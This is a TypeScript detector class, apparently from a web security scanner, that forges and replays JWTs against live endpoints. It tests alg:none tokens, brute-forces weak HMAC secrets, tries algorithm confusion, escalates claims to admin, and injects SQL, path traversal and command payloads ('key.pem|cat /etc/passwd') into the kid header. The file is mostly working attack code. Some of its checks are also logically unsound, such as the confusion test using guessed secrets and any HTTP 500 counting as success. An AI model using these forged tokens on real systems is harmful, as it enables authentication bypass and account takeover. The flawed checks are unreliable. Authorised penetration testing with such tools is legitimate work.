/**
 * Advanced Token Analyzer
 * JWT and Session Token Exploitation
 * 
 * BLACKHAT INSIGHT: Weak JWT implementations are everywhere.
 * Tests algorithm confusion, weak secrets, and privilege escalation.
 */

import { BaseDetector } from '../base/BaseDetector';
import {
    DetectorResult,
    AttackSurface,
    PlatformDetectionResult,
    Parameter
} from '../../types';
import { logger } from '../../core/Logger';
import * as jwt from 'jsonwebtoken';

interface Token {
    value: string;
    type: 'jwt' | 'session' | 'api_key' | 'bearer';
    location: 'header' | 'cookie' | 'body';
    endpoint: string;
}

interface DecodedJWT {
    header: {
        alg: string;
        typ?: string;
        jku?: string;
        jwk?: any;
        kid?: string;
    };
    payload: {
        sub?: string;
        iss?: string;
        exp?: number;
        iat?: number;
        role?: string;
        admin?: boolean;
        permissions?: string[];
        [key: string]: unknown;
    };
    signature: string;
}

export class AdvancedTokenAnalyzer extends BaseDetector {
    private weakSecrets = [
        'secret', 'Secret', 'SECRET', 'secretkey', 'secret_key',
        '123456', 'password', 'Password', 'admin', 'key',
        'jwt_secret', 'jwt-secret', 'your-256-bit-secret',
        'your-secret-key', 'changeme', 'changeit', 'test',
        'dev', 'development', 'staging', 'production',
        '', ' ', 'null', 'undefined', 'supersecret',
    ];

    constructor() {
        super('advanced-token-analyzer', 'session');
    }

    async test(
        attackSurface: AttackSurface,
        platform: PlatformDetectionResult
    ): Promise<DetectorResult[]> {
        const findings: DetectorResult[] = [];

        // Extract all tokens from traffic
        const tokens = this.extractTokens(attackSurface);

        this.log('Starting token analysis', { tokenCount: tokens.length });

        for (const token of tokens) {
            if (this.isJWT(token.value)) {
                this.log(`Analyzing JWT token from ${token.location}`);
                findings.push(...await this.testJWT(token));
            } else if (token.type === 'session') {
                findings.push(...await this.testSessionToken(token));
            }
        }

        return findings.filter(f => f.vulnerable);
    }

    protected getRelevantParameters(attackSurface: AttackSurface): Parameter[] {
        return [];
    }

    /**
     * Extract tokens from attack surface traffic
     */
    private extractTokens(attackSurface: AttackSurface): Token[] {
        const tokens: Token[] = [];

        for (const ae of attackSurface.endpoints) {
            const endpoint = ae.endpoint;

            // Check Authorization header
            const authHeader = endpoint.headers?.['authorization'] ||
                endpoint.headers?.['Authorization'];
            if (authHeader) {
                const token = authHeader.replace(/^Bearer\s+/i, '');
                tokens.push({
                    value: token,
                    type: this.isJWT(token) ? 'jwt' : 'bearer',
                    location: 'header',
                    endpoint: endpoint.url,
                });
            }

            // Check Cookie header
            const cookieHeader = endpoint.headers?.['cookie'] ||
                endpoint.headers?.['Cookie'];
            if (cookieHeader) {
                const cookies = this.parseCookies(cookieHeader);
                for (const [name, value] of Object.entries(cookies)) {
                    if (this.isJWT(value)) {
                        tokens.push({
                            value,
                            type: 'jwt',
                            location: 'cookie',
                            endpoint: endpoint.url,
                        });
                    } else if (/session|token|auth/i.test(name)) {
                        tokens.push({
                            value,
                            type: 'session',
                            location: 'cookie',
                            endpoint: endpoint.url,
                        });
                    }
                }
            }
        }

        return tokens;
    }

    /**
     * Parse cookie header into key-value pairs
     */
    private parseCookies(cookieHeader: string): Record<string, string> {
        const cookies: Record<string, string> = {};
        cookieHeader.split(';').forEach(cookie => {
            const [name, ...rest] = cookie.split('=');
            if (name && rest.length > 0) {
                cookies[name.trim()] = rest.join('=').trim();
            }
        });
        return cookies;
    }

    /**
     * Check if string is a JWT
     */
    private isJWT(token: string): boolean {
        const parts = token.split('.');
        if (parts.length !== 3) return false;

        try {
            const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
            return 'alg' in header;
        } catch {
            return false;
        }
    }

    /**
     * Decode JWT without verification
     */
    private decodeJWT(token: string): DecodedJWT | null {
        try {
            const decoded = jwt.decode(token, { complete: true });
            if (!decoded) return null;

            return {
                header: decoded.header as DecodedJWT['header'],
                payload: decoded.payload as DecodedJWT['payload'],
                signature: token.split('.')[2],
            };
        } catch {
            return null;
        }
    }

    /**
     * Run all JWT attack tests
     */
    private async testJWT(token: Token): Promise<DetectorResult[]> {
        const findings: DetectorResult[] = [];
        const decoded = this.decodeJWT(token.value);

        if (!decoded) return findings;

        this.log('JWT decoded', {
            alg: decoded.header.alg,
            hasJku: !!decoded.header.jku,
            hasJwk: !!decoded.header.jwk,
            claims: Object.keys(decoded.payload)
        });

        // Test 1: Algorithm 'none' attack
        const noneResult = await this.testAlgorithmNone(token, decoded);
        if (noneResult) findings.push(noneResult);

        // Test 2: Weak HMAC secret
        if (['HS256', 'HS384', 'HS512'].includes(decoded.header.alg)) {
            const weakSecretResult = await this.testWeakHMACSecret(token, decoded);
            if (weakSecretResult) findings.push(weakSecretResult);
        }

        // Test 3: Algorithm confusion (RS256 → HS256)
        if (['RS256', 'RS384', 'RS512'].includes(decoded.header.alg)) {
            const algConfusionResult = await this.testAlgorithmConfusion(token, decoded);
            if (algConfusionResult) findings.push(algConfusionResult);
        }

        // Test 4: Expired token acceptance
        const expiryResult = await this.testExpiredToken(token, decoded);
        if (expiryResult) findings.push(expiryResult);

        // Test 5: Privilege escalation
        const privEscResult = await this.testPrivilegeEscalation(token, decoded);
        if (privEscResult) findings.push(privEscResult);

        // Test 6: JKU/JWK header injection
        if (decoded.header.jku || decoded.header.jwk) {
            const jkuResult = await this.testJKUInjection(token, decoded);
            if (jkuResult) findings.push(jkuResult);
        }

        // Test 7: Kid parameter injection
        if (decoded.header.kid) {
            const kidResult = await this.testKidInjection(token, decoded);
            if (kidResult) findings.push(kidResult);
        }

        return findings;
    }

    /**
     * Test algorithm=none attack
     * Creates unsigned token and tests if server accepts it
     */
    private async testAlgorithmNone(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        // Create token with alg: none and no signature
        const headerNone = Buffer.from(JSON.stringify({
            ...decoded.header,
            alg: 'none'
        })).toString('base64url');

        const payload = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');
        const noneToken = `${headerNone}.${payload}.`;

        try {
            const response = await this.sendRequest({
                method: 'GET',
                url: token.endpoint,
                headers: {
                    'Authorization': `Bearer ${noneToken}`
                }
            });

            if (response.status === 200 && !this.isForbidden(response)) {
                return this.createResult('jwt_algorithm_none', true, 'CRITICAL', {
                    endpoint: token.endpoint,
                    evidence: [
                        'JWT with alg:none accepted',
                        'Signature verification bypassed'
                    ],
                    impact: 'Complete JWT authentication bypass - any token can be forged',
                    confidence: 0.95
                });
            }
        } catch {
            // Request failed
        }

        return null;
    }

    /**
     * Test for weak HMAC secrets via brute force
     */
    private async testWeakHMACSecret(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        for (const secret of this.weakSecrets) {
            try {
                // Try to verify with weak secret
                jwt.verify(token.value, secret, {
                    algorithms: [decoded.header.alg as jwt.Algorithm]
                });

                // If verification succeeds, secret is weak
                this.log(`Found weak JWT secret: "${secret}"`);

                return this.createResult('jwt_weak_secret', true, 'CRITICAL', {
                    endpoint: token.endpoint,
                    evidence: [
                        `JWT signed with weak secret: "${secret || '(empty)'}"`,
                        `Algorithm: ${decoded.header.alg}`
                    ],
                    impact: 'JWTs can be forged by anyone knowing the weak secret',
                    confidence: 1.0
                });
            } catch {
                // Wrong secret, continue
            }
        }

        return null;
    }

    /**
     * Test algorithm confusion attack (RS256 → HS256)
     * Use public key as HMAC secret when server uses RS256
     */
    private async testAlgorithmConfusion(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        // This attack requires knowing the public key
        // We'll test if server accepts HS256 when expecting RS256

        const headerHS256 = Buffer.from(JSON.stringify({
            ...decoded.header,
            alg: 'HS256'
        })).toString('base64url');

        const payload = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');

        // Sign with common weak secrets as if it were HS256
        for (const secret of ['secret', 'key', 'test']) {
            try {
                const forgedToken = jwt.sign(decoded.payload, secret, {
                    algorithm: 'HS256',
                    header: { ...decoded.header, alg: 'HS256' }
                });

                const response = await this.sendRequest({
                    method: 'GET',
                    url: token.endpoint,
                    headers: { 'Authorization': `Bearer ${forgedToken}` }
                });

                if (response.status === 200 && !this.isForbidden(response)) {
                    return this.createResult('jwt_algorithm_confusion', true, 'CRITICAL', {
                        endpoint: token.endpoint,
                        evidence: [
                            'Algorithm confusion attack successful',
                            `Changed from ${decoded.header.alg} to HS256`
                        ],
                        impact: 'JWT can be forged using public key as HMAC secret',
                        confidence: 0.9
                    });
                }
            } catch {
                // Continue
            }
        }

        return null;
    }

    /**
     * Test if expired tokens are still accepted
     */
    private async testExpiredToken(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        // Check if token has expiry
        if (!decoded.payload.exp) {
            return this.createResult('jwt_no_expiry', true, 'MEDIUM', {
                endpoint: token.endpoint,
                evidence: ['JWT has no expiration claim'],
                impact: 'Stolen tokens never expire',
                confidence: 0.8
            });
        }

        // Check if token is already expired but still working
        const now = Math.floor(Date.now() / 1000);
        if (decoded.payload.exp < now) {
            try {
                const response = await this.sendRequest({
                    method: 'GET',
                    url: token.endpoint,
                    headers: { 'Authorization': `Bearer ${token.value}` }
                });

                if (response.status === 200 && !this.isForbidden(response)) {
                    return this.createResult('jwt_expiry_not_enforced', true, 'HIGH', {
                        endpoint: token.endpoint,
                        evidence: [
                            `Token expired at ${new Date(decoded.payload.exp * 1000).toISOString()}`,
                            'Server still accepts expired token'
                        ],
                        impact: 'Token expiration not enforced',
                        confidence: 0.9
                    });
                }
            } catch {
                // Continue
            }
        }

        return null;
    }

    /**
     * Test privilege escalation by modifying claims
     */
    private async testPrivilegeEscalation(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        // Create payload with elevated privileges
        const elevatedPayload = {
            ...decoded.payload,
            role: 'admin',
            admin: true,
            isAdmin: true,
            permissions: ['*', 'admin', 'root'],
            user_type: 'admin',
        };

        // Try to sign with weak secrets
        for (const secret of ['secret', 'key', '']) {
            try {
                const forgedToken = jwt.sign(elevatedPayload, secret, {
                    algorithm: decoded.header.alg as jwt.Algorithm
                });

                const response = await this.sendRequest({
                    method: 'GET',
                    url: token.endpoint,
                    headers: { 'Authorization': `Bearer ${forgedToken}` }
                });

                if (this.detectElevatedPrivileges(response)) {
                    return this.createResult('jwt_privilege_escalation', true, 'CRITICAL', {
                        endpoint: token.endpoint,
                        evidence: [
                            'Privilege escalation via claim manipulation',
                            `Changed role/admin claims to elevated values`
                        ],
                        impact: 'User can escalate to admin privileges',
                        confidence: 0.9
                    });
                }
            } catch {
                // Continue
            }
        }

        return null;
    }

    /**
     * Test JKU (JWK Set URL) injection
     */
    private async testJKUInjection(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        if (decoded.header.jku) {
            return this.createResult('jwt_jku_present', true, 'HIGH', {
                endpoint: token.endpoint,
                evidence: [
                    `JKU header present: ${decoded.header.jku}`,
                    'Potential for key injection via controlled URL'
                ],
                impact: 'If attacker controls JKU URL, they can inject their own keys',
                confidence: 0.7
            });
        }

        return null;
    }

    /**
     * Test KID (Key ID) injection for SQL/path traversal
     */
    private async testKidInjection(
        token: Token,
        decoded: DecodedJWT
    ): Promise<DetectorResult | null> {
        const injectionPayloads = [
            "' OR '1'='1", // SQL injection
            "../../../etc/passwd", // Path traversal
            "key.pem|cat /etc/passwd", // Command injection
        ];

        for (const kidPayload of injectionPayloads) {
            const modifiedHeader = {
                ...decoded.header,
                kid: kidPayload
            };

            const headerBase64 = Buffer.from(JSON.stringify(modifiedHeader)).toString('base64url');
            const payloadBase64 = Buffer.from(JSON.stringify(decoded.payload)).toString('base64url');
            const injectedToken = `${headerBase64}.${payloadBase64}.${decoded.signature}`;

            try {
                const response = await this.sendRequest({
                    method: 'GET',
                    url: token.endpoint,
                    headers: { 'Authorization': `Bearer ${injectedToken}` }
                });

                // Check for signs of injection success
                if (response.body.includes('root:') ||
                    response.status === 500) {
                    return this.createResult('jwt_kid_injection', true, 'CRITICAL', {
                        endpoint: token.endpoint,
                        parameter: 'kid',
                        evidence: [`KID injection payload: ${kidPayload}`],
                        impact: 'Key ID parameter vulnerable to injection',
                        confidence: 0.8
                    });
                }
            } catch {
                // Continue
            }
        }

        return null;
    }

    /**
     * Test session tokens for predictability
     */
    private async testSessionToken(token: Token): Promise<DetectorResult[]> {
        const findings: DetectorResult[] = [];

        // Check for low entropy
        const entropy = this.calculateEntropy(token.value);
        if (entropy < 3) {
            findings.push(this.createResult('session_low_entropy', true, 'HIGH', {
                endpoint: token.endpoint,
                evidence: [`Session token entropy: ${entropy.toFixed(2)} bits/char`],
                impact: 'Session tokens may be predictable',
                confidence: 0.7
            }));
        }

        // Check for sequential patterns
        if (/^\d+$/.test(token.value) || /^[a-f0-9]{8,}$/i.test(token.value)) {
            if (this.looksSequential(token.value)) {
                findings.push(this.createResult('session_sequential', true, 'HIGH', {
                    endpoint: token.endpoint,
                    evidence: ['Session token appears sequential'],
                    impact: 'Session tokens can be predicted/enumerated',
                    confidence: 0.6
                }));
            }
        }

        return findings;
    }

    /**
     * Calculate Shannon entropy of a string
     */
    private calculateEntropy(str: string): number {
        const freq = new Map<string, number>();
        for (const char of str) {
            freq.set(char, (freq.get(char) || 0) + 1);
        }

        let entropy = 0;
        for (const count of freq.values()) {
            const p = count / str.length;
            entropy -= p * Math.log2(p);
        }

        return entropy;
    }

    /**
     * Check if value looks sequential
     */
    private looksSequential(value: string): boolean {
        // Check if mostly incrementing digits
        const digits = value.replace(/\D/g, '');
        if (digits.length > 5) {
            const num = parseInt(digits.slice(-8), 10);
            return num > 0 && num < 1000000000;
        }
        return false;
    }

    /**
     * Check if response indicates forbidden/unauthorized
     */
    private isForbidden(response: { status: number; body: string }): boolean {
        return response.status === 401 ||
            response.status === 403 ||
            /unauthorized|forbidden|invalid.*token/i.test(response.body);
    }

    /**
     * Detect if response shows elevated privileges
     */
    private detectElevatedPrivileges(response: { status: number; body: string }): boolean {
        const adminIndicators = [
            'admin', 'administrator', 'superuser',
            'all users', 'manage', 'dashboard',
            'settings', 'configuration'
        ];

        if (response.status !== 200) return false;

        return adminIndicators.some(indicator =>
            response.body.toLowerCase().includes(indicator)
        );
    }
}
